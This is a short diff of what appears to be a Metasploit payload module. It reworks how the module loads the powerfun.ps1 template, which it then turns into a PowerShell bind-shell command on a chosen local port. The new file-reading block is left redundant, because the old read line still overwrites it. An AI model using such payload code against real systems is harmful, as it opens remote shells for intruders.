@@ -53,11 +53,11 @@ module Metasploit3
   def command_string
     lport = datastore['LPORT']
 
-    template_path = File.join(
-    Msf::Config.data_directory,
-    'exploits',
-    'powershell',
-    'powerfun.ps1')
+    template_path = ::File.join( Msf::Config.data_directory, 'exploits', 'powershell','powerfun.ps1')
+    script_in = ""
+    ::File.open(template_path, "rb") do |fd|
+      script_in << fd.read(fd.stat.size)
+    end
 
     script_in = File.read(template_path)
     script_in << "\npowerfun -Command bind"
